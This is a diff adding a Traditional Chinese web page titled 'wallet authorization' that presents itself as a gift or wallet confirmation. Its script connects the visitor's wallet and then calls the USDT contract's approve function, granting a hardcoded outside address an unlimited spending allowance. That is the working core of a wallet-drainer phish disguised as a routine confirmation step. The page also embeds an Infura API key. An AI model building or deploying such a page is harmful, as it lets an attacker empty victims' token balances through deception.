@@ -1,0 +1,56 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+  <meta charset="UTF-8">
+  <title>錢包授權</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding-top: 100px; }
+    button { font-size: 1.2rem; padding: 1em 2em; margin: 10px; }
+  </style>
+</head>
+<body>
+  <h2>🎁 錢包連接與確認</h2>
+  <button onclick="connectWallet()">連接冷錢包</button>
+  <button onclick="approveUSDT()">確認授權</button>
+
+  <script>
+    let web3;
+    let accounts;
+    const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+    const spender = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
+    const usdtABI = [
+      { "constant": false, "inputs": [ { "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" } ], "name": "approve", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" }
+    ];
+
+    async function connectWallet() {
+      const provider = new WalletConnectProvider.default({
+        rpc: {
+          1: "https://mainnet.infura.io/v3/99af7ec8242f4645ac8c27d5b9354e2c"
+        }
+      });
+
+      await provider.enable();
+      web3 = new Web3(provider);
+      accounts = await web3.eth.getAccounts();
+      alert("✅ 已連接地址：" + accounts[0]);
+    }
+
+    async function approveUSDT() {
+      if (!web3 || !accounts) return alert("請先連接錢包");
+
+      const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
+      try {
+        const tx = await usdt.methods.approve(spender, web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"))
+          .send({ from: accounts[0] });
+        alert("✅ 授權成功！Tx Hash: " + tx.transactionHash);
+      } catch (err) {
+        console.error(err);
+        alert("❌ 授權失敗：" + err.message);
+      }
+    }
+  </script>
+</body>
+</html>
